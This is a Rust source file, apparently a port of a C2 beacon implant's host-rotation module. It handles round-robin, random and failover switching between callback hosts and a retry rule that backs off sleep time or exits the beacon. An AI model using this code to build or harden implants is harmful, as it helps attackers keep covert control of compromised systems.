//! Host/domain rotation strategy (strategy.cpp).

use crate::beacon::{HOST_STRATEGY_EVENT, HOST_STRATEGY_RANDOM, SETTING_MAX_RETRY_STRATEGY_ATTEMPTS, SETTING_MAX_RETRY_STRATEGY_DURATION, SETTING_MAX_RETRY_STRATEGY_INCREASE};
use crate::settings::setting_int;
use parking_lot::Mutex;

#[derive(Clone, Copy, Debug)]
pub struct StrategyInfo {
    /// 0 = round-robin, 1 = random, 2 = event based.
    pub strategy: i32,
    /// Seconds before host rotation. -1 disabled, 0 rotate every checkin.
    pub rotation_timer: i32,
    /// Seconds of consecutive failure before rotation. -1 disabled.
    pub failover_timer: i32,
    /// Consecutive failure count before rotation. -1 disabled.
    pub failover_maxfail: i32,
}

pub fn strategy_setup(
    si: &mut StrategyInfo,
    strategy: i32,
    rotation_timer: i32,
    failover_timer: i32,
    failover_maxfail: i32,
) {
    si.strategy = strategy;
    si.rotation_timer = rotation_timer;
    si.failover_timer = failover_timer;
    si.failover_maxfail = failover_maxfail;
}

// ---- state for the static-token implementations -------------------------

struct RoundRobin {
    token: Option<String>,
}

static RR: Mutex<RoundRobin> = Mutex::new(RoundRobin { token: None });

struct RandomState {
    hs: Option<String>,
    tokens: Vec<String>,
    token_index: i32,
}

static RAND: Mutex<RandomState> = Mutex::new(RandomState {
    hs: None,
    tokens: Vec::new(),
    token_index: -1,
});

struct PriorityState {
    hs: Option<String>,
    tokens: Vec<String>,
    token_index: i32,
    uri_offset: i32,
    failed_count: i32,
    start_time: i64,
    fail_window_start: i64,
}

static PRIO: Mutex<PriorityState> = Mutex::new(PriorityState {
    hs: None,
    tokens: Vec::new(),
    token_index: 0,
    uri_offset: 0,
    failed_count: 0,
    start_time: 0,
    fail_window_start: 0,
});

fn now_secs() -> i64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

/// Round-robin: hosts is "host1,/uri,host2,/uri,..."
fn next_host_round_robin(hosts: &[u8]) -> Option<Vec<u8>> {
    let mut rr = RR.lock();
    let hosts_str = String::from_utf8_lossy(hosts).into_owned();
    loop {
        match &rr.token {
            None => {
                rr.token = Some(hosts_str.clone());
                let mut parts = hosts_str.split(',');
                if let Some(first) = parts.next() {
                    // remember the rest for the next call
                    let rest: Vec<String> = parts.map(|s| s.to_string()).collect();
                    let first = first.as_bytes().to_vec();
                    rr.token = Some(rest.join(","));
                    return Some(first);
                }
                return None;
            }
            Some(t) => {
                if t.is_empty() {
                    rr.token = None;
                    continue;
                }
                let mut parts = t.split(',');
                if let Some(p) = parts.next() {
                    let rest: Vec<String> = parts.map(|s| s.to_string()).collect();
                    let result = p.as_bytes().to_vec();
                    rr.token = Some(rest.join(","));
                    return Some(result);
                }
                return None;
            }
        }
    }
}

fn random_in_range(min: i32, max: i32) -> i32 {
    use std::time::{SystemTime, UNIX_EPOCH};
    let seed = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos() as u32)
        .unwrap_or(0);
    let r = (seed.wrapping_mul(1103515245).wrapping_add(12345) >> 16) & 0x7fff;
    (r as i32 % (max - min + 1)) + min
}

fn even_number(number: i32) -> i32 {
    number - (number % 2)
}

fn next_host_random(hosts: &[u8]) -> Option<Vec<u8>> {
    let mut rnd = RAND.lock();
    let hosts_str = String::from_utf8_lossy(hosts).into_owned();
    if rnd.hs.is_none() {
        rnd.hs = Some(hosts_str.clone());
        rnd.tokens = hosts_str.split(',').map(|s| s.to_string()).collect();
        rnd.token_index = -1;
    }
    let token_count = rnd.tokens.len() as i32;
    if token_count == 0 {
        return None;
    }
    if rnd.token_index < 0 || rnd.token_index >= token_count {
        rnd.token_index = even_number(random_in_range(0, token_count - 1));
        return Some(rnd.tokens[rnd.token_index as usize].as_bytes().to_vec());
    } else {
        let x = rnd.token_index + 1;
        rnd.token_index = -1;
        if (x as usize) < rnd.tokens.len() {
            return Some(rnd.tokens[x as usize].as_bytes().to_vec());
        }
        return None;
    }
}

fn next_host_priority_failover(hosts: &[u8], last_checkin_failed: bool, si: &StrategyInfo) -> Option<Vec<u8>> {
    let mut p = PRIO.lock();
    let hosts_str = String::from_utf8_lossy(hosts).into_owned();
    let now = now_secs();
    let mut expired = false;

    let max_time_seconds = si.rotation_timer;
    let max_fail_times = si.failover_maxfail;
    let max_fail_seconds = si.failover_timer;

    // First pass? Load static fields...
    if p.hs.is_none() {
        p.hs = Some(hosts_str.clone());
        p.tokens = hosts_str.split(',').map(|s| s.to_string()).collect();
        p.token_index = 0;
        p.start_time = now;
        p.fail_window_start = 0;
        p.failed_count = 0;
        p.uri_offset = 0;
    }

    // Should we advance to the next host/uri pair?
    if last_checkin_failed {
        if max_fail_times > -1 {
            p.failed_count += 1;
            if p.failed_count > max_fail_times {
                expired = true;
            }
        }
        if max_fail_seconds > -1 {
            if p.fail_window_start != 0 {
                if now > p.fail_window_start + max_fail_seconds as i64 {
                    expired = true;
                }
            } else {
                p.fail_window_start = now;
            }
        }
    } else if p.uri_offset == 0 {
        p.fail_window_start = 0;
        p.failed_count = 0;
    }

    // Check for 'expired' host (only when getting the host)
    if max_time_seconds > -1 && !expired && p.uri_offset == 0 {
        if now > p.start_time + max_time_seconds as i64 {
            expired = true;
        }
    }

    // Are we failed or expired? Move to the next host...
    if expired {
        p.failed_count = 0;
        p.uri_offset = 0;
        p.fail_window_start = 0;
        p.token_index = p.token_index + 2;
        if p.token_index >= p.tokens.len() as i32 {
            p.token_index = 0;
        }
        p.start_time = now;
    }

    // Are we getting the Host name?
    if p.uri_offset == 0 {
        p.uri_offset = 1;
        return Some(p.tokens[p.token_index as usize].as_bytes().to_vec());
    }

    // URI at odd index
    p.uri_offset = 0;
    let idx = p.token_index + 1;
    if (idx as usize) < p.tokens.len() {
        Some(p.tokens[idx as usize].as_bytes().to_vec())
    } else {
        None
    }
}

/// Get the next host (or the URI of the previous host). Called in pairs.
pub fn next_host(hosts: &[u8], last_checkin_failed: bool, si: &StrategyInfo) -> Option<Vec<u8>> {
    if si.strategy == HOST_STRATEGY_RANDOM {
        next_host_random(hosts)
    } else if si.strategy == HOST_STRATEGY_EVENT {
        next_host_priority_failover(hosts, last_checkin_failed, si)
    } else {
        next_host_round_robin(hosts)
    }
}

/// Check the max retry strategy; adjust sleep time if threshold met.
/// Returns TRUE if the beacon should exit.
pub fn check_max_retry(
    failed_host: bool,
    max_retry_count: &mut i32,
    sleep_time: &mut u32,
    max_orig_sleep_time: &mut u32,
) -> bool {
    let max_retry_attempts = setting_int(SETTING_MAX_RETRY_STRATEGY_ATTEMPTS) as i32;
    let max_retry_increase = setting_int(SETTING_MAX_RETRY_STRATEGY_INCREASE) as i32;
    let max_retry_duration = setting_int(SETTING_MAX_RETRY_STRATEGY_DURATION) as i32;

    if max_retry_attempts > 0 {
        if failed_host {
            *max_retry_count += 1;
            if *max_retry_count >= max_retry_increase && *max_orig_sleep_time == 0 {
                *max_orig_sleep_time = *sleep_time;
                if *sleep_time < (max_retry_duration as u32) * 1000 {
                    *sleep_time = (max_retry_duration as u32) * 1000;
                }
            }
            if *max_retry_count >= max_retry_attempts {
                return true;
            }
        } else if *max_retry_count > 0 {
            *max_retry_count = 0;
            if *max_orig_sleep_time > 0 {
                *sleep_time = *max_orig_sleep_time;
                *max_orig_sleep_time = 0;
            }
        }
    }
    false
}
